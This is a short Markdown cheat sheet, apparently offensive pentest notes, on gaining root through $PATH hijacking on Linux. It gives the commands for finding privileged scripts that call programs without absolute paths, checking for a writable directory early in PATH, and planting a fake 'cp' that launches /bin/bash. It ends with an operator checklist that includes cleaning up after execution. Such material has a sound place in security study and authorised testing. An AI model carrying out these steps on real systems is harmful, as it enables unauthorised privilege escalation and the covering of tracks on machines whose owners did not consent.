
# PATH Hijacking  

Hijacking `$PATH` works when a script or binary calls another program **without an absolute path** (`cp`, `tar`, `php`, `ls`, etc.).  
If a writable directory appears **before** system paths, we can replace the command with a malicious one.

---

## 1. Identify PATH-Sensitive Commands
Look inside scripts executed by root, cron, systemd, or SUID binaries:

```bash
strings /usr/local/bin/somescript
cat /usr/local/bin/backup.sh
````

Vulnerable examples:

```
cp file1 file2
tar czf backup.tar.gz folder/
ls /tmp/
```

Absolute paths are not used → vulnerable.

---

## 2. Check PATH Order

```bash
echo $PATH
```

Example:

```
/home/user/bin:/usr/local/sbin:/usr/local/bin:/usr/bin:/bin
```

If **/home/user/bin** is writable → exploitable.

---

## 3. Create Malicious Replacement

Example hijacking `cp`:

```bash
echo "/bin/bash" > cp
chmod +x cp
mv cp /home/user/bin/
```

Now any script calling `cp` executes **your shell**.

---

## 4. Trigger the Escalation

Wait for:

* cron
* SUID call
* systemd service
* privileged script

You get root:

```bash
whoami
# root
```

---

## 5. Quick Operator Checklist

* [ ] Script uses commands without absolute paths
* [ ] Writable directory appears first in `$PATH`
* [ ] You can drop a malicious binary
* [ ] Privileged context runs the script
* [ ] Clean up after execution

---

**Misconfigs → PrivEsc.**

